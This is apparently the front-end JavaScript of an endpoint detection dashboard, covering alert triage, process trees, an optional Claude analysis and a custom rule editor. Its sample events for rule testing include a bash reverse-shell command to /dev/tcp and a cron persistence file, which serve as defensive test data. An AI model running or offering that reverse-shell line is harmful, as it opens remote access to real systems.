"use strict";

const $ = (s) => document.querySelector(s);
const el = (tag, cls, txt) => { const n = document.createElement(tag); if (cls) n.className = cls; if (txt != null) n.textContent = txt; return n; };
const SEV_ORDER = ["critical", "high", "medium", "low"];

const state = { alerts: [], devices: [], openAlertId: null, settings: null };

async function api(path, opts) {
  const r = await fetch(path, opts);
  if (!r.ok) {
    let msg = r.statusText;
    try { msg = (await r.json()).detail || msg; } catch (e) {}
    throw new Error(msg);
  }
  return r.status === 204 ? null : r.json();
}

function fmtTime(ts) {
  const d = new Date(ts * 1000);
  const now = Date.now() / 1000;
  const diff = now - ts;
  if (diff < 60) return Math.max(0, Math.floor(diff)) + "s ago";
  if (diff < 3600) return Math.floor(diff / 60) + "m ago";
  if (diff < 86400) return Math.floor(diff / 3600) + "h ago";
  return d.toLocaleDateString([], { month: "short", day: "numeric" }) + " " +
         d.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
}
function ago(ts) {
  if (!ts) return "never";
  const diff = Date.now() / 1000 - ts;
  if (diff < 60) return Math.floor(diff) + "s";
  if (diff < 3600) return Math.floor(diff / 60) + "m";
  if (diff < 86400) return Math.floor(diff / 3600) + "h";
  return Math.floor(diff / 86400) + "d";
}

/* ---------- polling ---------- */
async function refresh() {
  try {
    const [stats, devices] = await Promise.all([api("/api/stats"), api("/api/devices")]);
    const q = new URLSearchParams();
    if ($("#f-status").value) q.set("status", $("#f-status").value);
    if ($("#f-severity").value) q.set("severity", $("#f-severity").value);
    const alerts = await api("/api/alerts?" + q.toString());

    state.devices = devices; state.alerts = alerts;
    setConn(true);
    renderCounters(stats.alerts || {});
    $("#meta-devices").textContent = stats.devices + " device" + (stats.devices === 1 ? "" : "s");
    $("#meta-rules").textContent = stats.rules + " rules";
    renderFleet(devices);
    renderAlerts(alerts);
  } catch (e) {
    setConn(false, e.message);
  }
}

function setConn(ok, msg) {
  const c = $("#conn-state");
  if (ok) { c.textContent = "live"; c.className = "brand-sub live"; }
  else { c.textContent = "offline"; c.className = "brand-sub down"; c.title = msg || ""; }
}

function renderCounters(counts) {
  const wrap = $("#counters"); wrap.innerHTML = "";
  for (const sev of SEV_ORDER) {
    const c = el("div", "counter " + sev);
    c.appendChild(el("span", "n", String(counts[sev] || 0)));
    c.appendChild(el("span", "lbl", sev));
    wrap.appendChild(c);
  }
}

function renderFleet(devices) {
  const list = $("#fleet-list"); list.innerHTML = "";
  if (!devices.length) { list.appendChild(el("div", "empty", "No agents enrolled yet.")); return; }
  for (const d of devices) {
    const row = el("div", "device");
    row.appendChild(el("span", "dot" + (d.online ? " online" : "")));
    const body = el("div");
    body.appendChild(el("div", "host", d.hostname || "(unknown)"));
    body.appendChild(el("div", "sub", `${d.platform || "?"} · seen ${ago(d.last_seen)} ago`));
    row.appendChild(body);
    list.appendChild(row);
  }
}

function renderAlerts(alerts) {
  const t = $("#alert-table"); t.innerHTML = "";
  if (!alerts.length) { t.appendChild(el("div", "empty", "No alerts match the current filter.")); return; }
  for (const a of alerts) {
    const row = el("div", "alert-row" + (a.id === state.openAlertId ? " active" : ""));
    row.tabIndex = 0;
    row.appendChild(el("div", "sev-bar sev-" + a.severity));
    row.appendChild(el("div", "col-time", fmtTime(a.ts)));

    const title = el("div", "col-title");
    title.appendChild(el("div", "t", a.title));
    title.appendChild(el("div", "rid", a.rule_id));
    row.appendChild(title);

    row.appendChild(el("div", "col-host", a.hostname || "—"));

    const chips = el("div", "chips");
    (a.mitre || []).slice(0, 3).forEach((m) => chips.appendChild(el("span", "chip", m)));
    row.appendChild(chips);

    const tag = el("div", "status-tag st-" + a.status, a.status);
    row.appendChild(tag);

    const open = () => openStory(a.id);
    row.addEventListener("click", open);
    row.addEventListener("keydown", (e) => { if (e.key === "Enter") open(); });
    t.appendChild(row);
  }
}

/* ---------- alert story drawer ---------- */
async function openStory(id) {
  state.openAlertId = id;
  renderAlerts(state.alerts);
  $("#drawer-scrim").classList.add("open");
  const drawer = $("#drawer");
  drawer.classList.add("open"); drawer.setAttribute("aria-hidden", "false");
  drawer.innerHTML = `<div class="section"><span class="behav-empty">Loading…</span></div>`;
  try {
    const data = await api("/api/alerts/" + id);
    drawer.innerHTML = "";
    drawer.appendChild(storyHead(data));
    drawer.appendChild(storyActions(data));
    drawer.appendChild(ruleSection(data));
    drawer.appendChild(eventSection(data));
    drawer.appendChild(treeSection(data));
    drawer.appendChild(timelineSection(data));
    drawer.appendChild(behavioralSection(data));
  } catch (e) {
    drawer.innerHTML = `<div class="section"><span class="behav-empty">Failed to load: ${e.message}</span></div>`;
  }
}
function closeStory() {
  state.openAlertId = null;
  $("#drawer").classList.remove("open"); $("#drawer").setAttribute("aria-hidden", "true");
  $("#drawer-scrim").classList.remove("open");
  renderAlerts(state.alerts);
}

function storyHead(d) {
  const a = d.alert;
  const head = el("div", "story-head");
  const close = el("button", "btn ghost drawer-close", "Close"); close.onclick = closeStory;
  head.appendChild(close);
  const row1 = el("div", "row1");
  row1.appendChild(el("span", "sev-badge sev-" + a.severity, a.severity));
  (a.mitre || []).forEach((m) => row1.appendChild(el("span", "chip", m)));
  head.appendChild(row1);
  head.appendChild(el("div", "story-title", a.title));
  const meta = el("div", "story-meta");
  meta.appendChild(el("span", null, "host: " + (d.device.hostname || a.hostname || "—")));
  meta.appendChild(el("span", null, "platform: " + (d.device.platform || "?")));
  meta.appendChild(el("span", null, fmtTime(a.ts)));
  meta.appendChild(el("span", null, "rule: " + a.rule_id));
  head.appendChild(meta);
  return head;
}

function storyActions(d) {
  const a = d.alert;
  const wrap = el("div", "story-actions");
  const seg = el("div", "seg");
  ["new", "investigating", "resolved"].forEach((s) => {
    const b = el("button", a.status === s ? "on" : "", s);
    b.onclick = async () => {
      try {
        const res = await api(`/api/alerts/${a.id}/status`, {
          method: "POST", headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ status: s }) });
        if (s === "resolved" || (res && res.deleted)) {
          closeStory(); refresh();   // resolving removes it from the dashboard
        } else {
          a.status = s; openStory(a.id); refresh();
        }
      } catch (e) { alert("Could not update status: " + e.message); }
    };
    seg.appendChild(b);
  });
  wrap.appendChild(seg);
  return wrap;
}

function section(title) { const s = el("section", "section"); s.appendChild(el("h3", null, title)); return s; }

function ruleSection(d) {
  const s = section("Why this fired");
  const r = d.rule;
  if (r.description) s.appendChild(Object.assign(el("p"), { textContent: r.description, style: "margin:0 0 12px;color:var(--ink-dim);font-size:12px;line-height:1.5" }));
  (r.match || []).forEach((c) => {
    const line = el("div", "cond");
    const vals = c.values ? c.values.join(", ") : (c.value != null ? String(c.value) : "");
    line.innerHTML = `<span class="f">${c.field || ""}</span> <span class="op">${c.op || "equals"}</span> ${escapeHtml(vals)}`;
    s.appendChild(line);
  });
  if (r.references && r.references.length) {
    const refs = el("div"); refs.style.marginTop = "10px";
    r.references.forEach((u) => {
      const a = el("a", null, u); a.href = u; a.target = "_blank"; a.rel = "noreferrer";
      a.style.cssText = "display:block;font-family:var(--mono);font-size:10.5px;color:var(--accent);word-break:break-all;margin-top:2px";
      refs.appendChild(a);
    });
    s.appendChild(refs);
  }
  return s;
}

function eventSection(d) {
  const s = section("Triggering event");
  const pre = el("pre", "code", JSON.stringify(d.alert.event || {}, null, 2));
  s.appendChild(pre);
  return s;
}

function treeSection(d) {
  const s = section("Process lineage");
  const tree = d.process_tree || [];
  if (!tree.length) { s.appendChild(el("div", "behav-empty", "No process lineage reconstructed for this event.")); }
  else {
    const t = el("div", "tree");
    tree.forEach((n) => {
      const node = el("div", "tnode" + (n.is_trigger ? " trigger" : ""));
      const spine = el("div", "spine"); spine.appendChild(el("span", "knob")); spine.style.marginLeft = (n.depth * 16) + "px";
      node.appendChild(spine);
      const body = el("div", "body");
      const head = el("div");
      head.appendChild(el("span", "pname", n.process_name || "(unknown)"));
      head.appendChild(el("span", "pids", `pid ${n.pid != null ? n.pid : "?"} · ppid ${n.ppid != null ? n.ppid : "?"}`));
      body.appendChild(head);
      if (n.cmdline) body.appendChild(el("div", "cmd", n.cmdline));
      node.appendChild(body);
      t.appendChild(node);
    });
    s.appendChild(t);
  }
  if (d.story_note) s.appendChild(el("div", "story-note", d.story_note));
  return s;
}

function timelineSection(d) {
  const s = section(`Timeline · ±5 min on host (${(d.timeline || []).length} events)`);
  const tl = d.timeline || [];
  if (!tl.length) { s.appendChild(el("div", "behav-empty", "No surrounding telemetry captured.")); return s; }
  tl.forEach((e) => {
    const it = el("div", "tl-item" + (e.is_trigger ? " trigger" : ""));
    it.appendChild(el("div", "tl-time", e.ts_iso.split("T")[1].replace("Z", "")));
    it.appendChild(el("div", "tl-cat " + (e.category || ""), `${e.category || "?"}/${e.action || ""}`));
    it.appendChild(el("div", "tl-sum", e.summary || ""));
    s.appendChild(it);
  });
  return s;
}

function behavioralSection(d) {
  const s = section("Behavioral analysis (Claude)");
  const out = el("div");
  const render = (text) => { out.innerHTML = ""; out.appendChild(el("div", "behav", text)); };
  if (d.behavioral) render(d.behavioral);
  else out.appendChild(el("div", "behav-empty",
    state.settings && state.settings.claude_enabled
      ? "Not yet analyzed."
      : "Disabled. Add a Claude token in Settings to enable."));
  s.appendChild(out);

  if (state.settings && state.settings.claude_enabled) {
    const b = el("button", "btn", d.behavioral ? "Re-run analysis" : "Run analysis");
    b.style.marginTop = "12px";
    b.onclick = async () => {
      b.disabled = true; b.textContent = "Analyzing…";
      try {
        const res = await api(`/api/alerts/${d.alert.id}/analyze`, { method: "POST" });
        render(res.behavioral);
        b.textContent = "Re-run analysis";
      } catch (e) {
        out.innerHTML = ""; out.appendChild(el("div", "behav-empty", "Analysis failed: " + e.message));
        b.textContent = "Run analysis";
      } finally { b.disabled = false; }
    };
    s.appendChild(b);
  }
  return s;
}

function escapeHtml(str) {
  return String(str).replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]));
}

/* ---------- settings ---------- */
async function loadSettings() {
  try {
    state.settings = await api("/api/settings");
    $("#set-enabled").checked = state.settings.claude_enabled;
    $("#set-model").value = state.settings.claude_model || "";
    $("#token-state").textContent = state.settings.claude_token_set
      ? "(set: " + state.settings.claude_token_masked + ")" : "(not set)";
  } catch (e) {}
}
function openSettings() { loadSettings(); $("#settings-scrim").classList.add("open"); }
function closeSettings() { $("#settings-scrim").classList.remove("open"); $("#save-state").textContent = ""; }

async function saveSettings() {
  const body = {
    claude_enabled: $("#set-enabled").checked,
    claude_model: $("#set-model").value.trim() || null,
  };
  const tok = $("#set-token").value;
  if (tok !== "") body.claude_token = tok; // blank keeps existing
  try {
    state.settings = await api("/api/settings", {
      method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body),
    });
    $("#set-token").value = "";
    $("#save-state").textContent = "Saved.";
    loadSettings();
    if (state.openAlertId) openStory(state.openAlertId);
  } catch (e) { $("#save-state").textContent = "Error: " + e.message; }
}

/* ---------- wire up ---------- */
$("#btn-settings").onclick = openSettings;
$("#settings-close").onclick = closeSettings;
$("#settings-scrim").addEventListener("click", (e) => { if (e.target === $("#settings-scrim")) closeSettings(); });
$("#set-save").onclick = saveSettings;
$("#drawer-scrim").onclick = closeStory;
$("#f-status").onchange = refresh;
$("#f-severity").onchange = refresh;
document.addEventListener("keydown", (e) => { if (e.key === "Escape") { closeStory(); closeSettings(); } });

loadSettings();
refresh();
setInterval(refresh, 5000);

/* ===================== Rules view + custom rule editor ===================== */
state.view = "alerts";
state.rules = [];
state.editing = null; // {mode: 'new'|'edit'|'view', id}

const OPS = ["equals","not_equals","in","not_in","contains","contains_any","contains_all",
  "startswith","endswith","regex","gt","lt","gte","lte","exists","not_exists",
  "ip_public","ip_private","ip_in","ip_not_in"];
const NO_VALUE_OPS = ["exists","not_exists","ip_public","ip_private"];
const LIST_OPS = ["in","not_in","contains_any","contains_all","startswith","endswith","regex","ip_in","ip_not_in"];
const SEV_RANK = { critical: 0, high: 1, medium: 2, low: 3 };

const SAMPLES = {
  process: { category: "process", platform: "linux",
    process: { name: "bash", exe: "/bin/bash", cmdline: "bash -i >& /dev/tcp/8.8.8.8/4444 0>&1",
      username: "www-data", parent_name: "python3", pid: 1000, ppid: 900 } },
  file: { category: "file", platform: "linux", action: "create",
    file: { path: "/etc/cron.d/evil", name: "evil" } },
  network: { category: "network", platform: "linux",
    network: { process_name: "python3", raddr: "8.8.8.8", rport: 443, status: "ESTABLISHED", proto: "tcp" } },
  auth: { category: "auth", platform: "linux",
    auth: { method: "ssh", result: "failure", user: "root", source_ip: "8.8.8.8" } },
  "": { category: "process", process: { cmdline: "example -enc AAAA" } },
};

function switchView(v) {
  state.view = v;
  $("#view-alerts").hidden = v !== "alerts";
  $("#view-rules").hidden = v !== "rules";
  $("#tab-alerts").classList.toggle("on", v === "alerts");
  $("#tab-rules").classList.toggle("on", v === "rules");
  if (v === "rules") loadRules();
}

async function loadRules() {
  try {
    const res = await api("/api/rules");
    state.rules = res.rules || [];
    renderRules();
  } catch (e) {
    $("#rules-table").innerHTML = "";
    $("#rules-table").appendChild(el("div", "empty", "Could not load rules: " + e.message));
  }
}

function renderRules() {
  const t = $("#rules-table"); t.innerHTML = "";
  let rows = state.rules.slice();
  const src = $("#rf-source").value, sv = $("#rf-severity").value;
  if (src) rows = rows.filter((r) => r.source === src);
  if (sv) rows = rows.filter((r) => r.severity === sv);
  rows.sort((a, b) =>
    (a.source === b.source ? 0 : a.source === "custom" ? -1 : 1) ||
    (SEV_RANK[a.severity] - SEV_RANK[b.severity]) || a.id.localeCompare(b.id));
  if (!rows.length) { t.appendChild(el("div", "empty", "No rules match the current filter.")); return; }
  rows.forEach((r) => t.appendChild(ruleRow(r)));
}

function ruleRow(r) {
  const row = el("div", "rule-row");
  row.appendChild(el("div", "sev-bar sev-" + r.severity));
  row.appendChild(el("div", "rid", r.id));
  row.appendChild(el("div", "rtitle", r.title));
  row.appendChild(el("div", "rcat", r.category || "any"));
  row.appendChild(el("div", "rplat", (r.platform && r.platform.length) ? r.platform.join(", ") : "all"));
  const chips = el("div", "chips");
  (r.mitre || []).slice(0, 3).forEach((m) => chips.appendChild(el("span", "chip", m)));
  row.appendChild(chips);
  row.appendChild(el("div", "src-tag src-" + r.source, r.source === "custom" ? "custom" : "built-in"));

  const last = el("div", "rule-last");
  const st = el("div", "rstate");
  if (r.source === "custom") {
    const sw = el("label", "switch");
    const inp = document.createElement("input"); inp.type = "checkbox"; inp.checked = !!r.enabled;
    inp.setAttribute("aria-label", "enable rule");
    inp.addEventListener("click", (e) => { e.stopPropagation(); toggleRule(r, inp.checked); });
    sw.appendChild(inp); sw.appendChild(el("span", "track"));
    st.appendChild(sw); st.appendChild(el("span", "lbl", r.enabled ? "on" : "off"));
  } else {
    st.appendChild(el("span", "lbl", "active"));
  }
  last.appendChild(st);

  const act = el("div", "rule-actions");
  if (r.source === "custom") {
    const e = el("button", "btn ghost sm", "Edit");
    e.onclick = (ev) => { ev.stopPropagation(); openEditor(r, "edit"); };
    const d = el("button", "btn ghost sm danger", "Delete");
    d.onclick = (ev) => { ev.stopPropagation(); deleteRule(r); };
    act.appendChild(e); act.appendChild(d);
  } else {
    const v = el("button", "btn ghost sm", "View");
    v.onclick = (ev) => { ev.stopPropagation(); openEditor(r, "view"); };
    act.appendChild(v);
  }
  last.appendChild(act);
  row.appendChild(last);

  row.addEventListener("click", () => openEditor(r, r.source === "custom" ? "edit" : "view"));
  return row;
}

async function toggleRule(r, enabled) {
  try {
    await api(`/api/rules/custom/${r.id}/toggle`, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ enabled }) });
    r.enabled = enabled; renderRules(); refresh();
  } catch (e) { alert("Toggle failed: " + e.message); loadRules(); }
}

async function deleteRule(r) {
  if (!confirm(`Delete custom rule "${r.id}"? This cannot be undone.`)) return;
  try {
    await api(`/api/rules/custom/${r.id}`, { method: "DELETE" });
    closeEditor(); loadRules(); refresh();
  } catch (e) { alert("Delete failed: " + e.message); }
}

/* ---- editor ---- */
function valueState(row) {
  const op = row.querySelector(".cond-op").value;
  const v = row.querySelector(".cond-val");
  if (NO_VALUE_OPS.includes(op)) { v.disabled = true; v.value = ""; v.placeholder = "(no value)"; }
  else if (LIST_OPS.includes(op)) { v.disabled = false; v.placeholder = "comma / newline separated"; }
  else { v.disabled = false; v.placeholder = "value"; }
}

function conditionRow(cond) {
  cond = cond || { field: "", op: "contains", value: "" };
  const row = el("div", "re-cond");
  const f = document.createElement("input");
  f.className = "cond-field"; f.setAttribute("list", "re-fields");
  f.placeholder = "field"; f.value = cond.field || "";
  const op = document.createElement("select"); op.className = "cond-op";
  OPS.forEach((o) => { const opt = document.createElement("option"); opt.value = o; opt.textContent = o; op.appendChild(opt); });
  op.value = cond.op || "contains";
  const val = document.createElement("input"); val.className = "cond-val";
  if (cond.values) val.value = cond.values.join(", ");
  else if (cond.value != null) val.value = String(cond.value);
  const del = el("button", "cond-del", "×"); del.type = "button"; del.setAttribute("aria-label", "remove condition");
  del.onclick = () => { row.remove(); updateYaml(); };
  row.append(f, op, val, del);
  [f, op, val].forEach((inp) => inp.addEventListener("input", updateYaml));
  op.addEventListener("change", () => { valueState(row); updateYaml(); });
  row.append();
  valueState(row);
  return row;
}

function parseVals(str) { return str.split(/[\n,]/).map((s) => s.trim()).filter(Boolean); }

function buildDefinition() {
  const match = [];
  $("#re-conditions").querySelectorAll(".re-cond").forEach((row) => {
    const field = row.querySelector(".cond-field").value.trim();
    const op = row.querySelector(".cond-op").value;
    const raw = row.querySelector(".cond-val").value;
    if (!field && !NO_VALUE_OPS.includes(op)) return;
    if (NO_VALUE_OPS.includes(op)) match.push({ field, op });
    else if (LIST_OPS.includes(op)) match.push({ field, op, values: parseVals(raw) });
    else match.push({ field, op, value: raw.trim() });
  });
  const defn = {
    title: $("#re-title").value.trim(),
    severity: $("#re-severity").value,
    description: $("#re-desc").value.trim(),
    detection: { match },
  };
  const id = $("#re-id").value.trim();
  if (id) defn.id = id;
  const cat = $("#re-category").value;
  if (cat) defn.category = cat;
  const plats = [...document.querySelectorAll(".re-plat:checked")].map((c) => c.value);
  if (plats.length) defn.platform = plats;
  const mitre = parseVals($("#re-mitre").value);
  if (mitre.length) defn.mitre = mitre;
  const refs = $("#re-refs").value.split(/\n/).map((s) => s.trim()).filter(Boolean);
  if (refs.length) defn.references = refs;
  return defn;
}

function yamlString(d) {
  const q = (v) => { const s = String(v); return (s === "" || /[:#\-\s'"{}\[\]]/.test(s)) ? JSON.stringify(s) : s; };
  const L = [];
  L.push("id: " + (d.id || "(auto from title)"));
  L.push("title: " + q(d.title || ""));
  L.push("severity: " + (d.severity || "medium"));
  if (d.category) L.push("category: " + d.category);
  if (d.platform && d.platform.length) L.push("platform: [" + d.platform.join(", ") + "]");
  if (d.description) L.push("description: " + q(d.description));
  if (d.mitre && d.mitre.length) L.push("mitre: [" + d.mitre.join(", ") + "]");
  L.push("detection:");
  L.push("  match:");
  (d.detection.match || []).forEach((c) => {
    L.push("    - field: " + (c.field || ""));
    L.push("      op: " + (c.op || "equals"));
    if ("value" in c) L.push("      value: " + q(c.value));
    if ("values" in c) { L.push("      values:"); c.values.forEach((v) => L.push("        - " + q(v))); }
  });
  if (d.references && d.references.length) { L.push("references:"); d.references.forEach((r) => L.push("  - " + r)); }
  return L.join("\n");
}

function updateYaml() { $("#re-yaml").textContent = yamlString(buildDefinition()); }

function lockForm(locked) {
  const form = $(".re-form");
  form.classList.toggle("locked", locked);
  form.querySelectorAll("input, select, textarea, button").forEach((n) => { n.disabled = locked; });
  $("#re-id").disabled = locked || state.editing.mode !== "new";
}

function openEditor(rule, mode) {
  state.editing = { mode, id: rule ? rule.id : null };
  $("#rule-title").textContent =
    mode === "new" ? "New custom rule" : mode === "edit" ? "Edit custom rule" : "Built-in rule (read-only)";
  // reset
  $("#re-id").value = rule ? rule.id : "";
  $("#re-title").value = rule ? (rule.title || "") : "";
  $("#re-severity").value = rule ? (rule.severity || "high") : "high";
  $("#re-category").value = rule ? (rule.category || "") : "";
  document.querySelectorAll(".re-plat").forEach((c) => { c.checked = !!(rule && (rule.platform || []).includes(c.value)); });
  $("#re-desc").value = rule ? (rule.description || "") : "";
  $("#re-mitre").value = rule ? (rule.mitre || []).join(", ") : "";
  $("#re-refs").value = rule ? (rule.references || []).join("\n") : "";
  const conds = $("#re-conditions"); conds.innerHTML = "";
  const matches = (rule && rule.match && rule.match.length) ? rule.match : [{ field: "", op: "contains", value: "" }];
  matches.forEach((c) => conds.appendChild(conditionRow(c)));
  $("#re-sample").value = ""; $("#re-test-out").textContent = ""; $("#re-status").textContent = "";

  const isView = mode === "view";
  $("#re-save").hidden = isView;
  $("#re-validate").hidden = isView;
  $("#re-delete").hidden = mode !== "edit";
  $("#re-id").disabled = mode !== "new";

  updateYaml();
  lockForm(isView);
  $("#re-id").disabled = isView || mode !== "new";
  $("#rule-scrim").classList.add("open");
}

function closeEditor() { $("#rule-scrim").classList.remove("open"); state.editing = null; }

async function validateRule(showOk) {
  const out = $("#re-status");
  try {
    const res = await api("/api/rules/validate", {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ definition: buildDefinition() }) });
    if (res.valid) { out.className = "re-status ok"; if (showOk) out.textContent = "Valid rule."; return true; }
    out.className = "re-status err"; out.textContent = res.error || "Invalid"; return false;
  } catch (e) { out.className = "re-status err"; out.textContent = e.message; return false; }
}

async function testRule() {
  const out = $("#re-test-out");
  let sample;
  try { sample = JSON.parse($("#re-sample").value); }
  catch (e) { out.className = "re-test-out err"; out.textContent = "Sample is not valid JSON"; return; }
  try {
    const res = await api("/api/rules/validate", {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ definition: buildDefinition(), sample_event: sample }) });
    if (!res.valid) { out.className = "re-test-out err"; out.textContent = res.error; return; }
    if (res.matched) { out.className = "re-test-out ok"; out.textContent = "✓ matches — this event would alert"; }
    else { out.className = "re-test-out no"; out.textContent = "✗ no match on this event"; }
  } catch (e) { out.className = "re-test-out err"; out.textContent = e.message; }
}

async function saveRule() {
  if (!(await validateRule(false))) return;
  const defn = buildDefinition();
  const editing = state.editing;
  try {
    if (editing.mode === "edit") {
      await api(`/api/rules/custom/${editing.id}`, {
        method: "PUT", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ definition: defn, enabled: true }) });
    } else {
      await api("/api/rules/custom", {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ definition: defn, enabled: true }) });
    }
    closeEditor(); loadRules(); refresh();
  } catch (e) { const o = $("#re-status"); o.className = "re-status err"; o.textContent = e.message; }
}

/* ---- wiring ---- */
$("#tab-alerts").onclick = () => switchView("alerts");
$("#tab-rules").onclick = () => switchView("rules");
$("#rf-source").onchange = renderRules;
$("#rf-severity").onchange = renderRules;
$("#btn-new-rule").onclick = () => openEditor(null, "new");
$("#re-add-cond").onclick = () => { $("#re-conditions").appendChild(conditionRow()); updateYaml(); };
$("#rule-close").onclick = closeEditor;
$("#re-cancel").onclick = closeEditor;
$("#rule-scrim").addEventListener("click", (e) => { if (e.target === $("#rule-scrim")) closeEditor(); });
$("#re-validate").onclick = () => validateRule(true);
$("#re-test").onclick = testRule;
$("#re-example").onclick = () => { $("#re-sample").value = JSON.stringify(SAMPLES[$("#re-category").value] || SAMPLES[""], null, 2); };
$("#re-save").onclick = saveRule;
$("#re-delete").onclick = () => { if (state.editing) deleteRule({ id: state.editing.id }); };
["re-title","re-severity","re-category","re-desc","re-mitre","re-refs","re-id"].forEach((id) =>
  document.getElementById(id).addEventListener("input", updateYaml));
document.querySelectorAll(".re-plat").forEach((c) => c.addEventListener("change", updateYaml));
document.addEventListener("keydown", (e) => { if (e.key === "Escape") closeEditor(); });
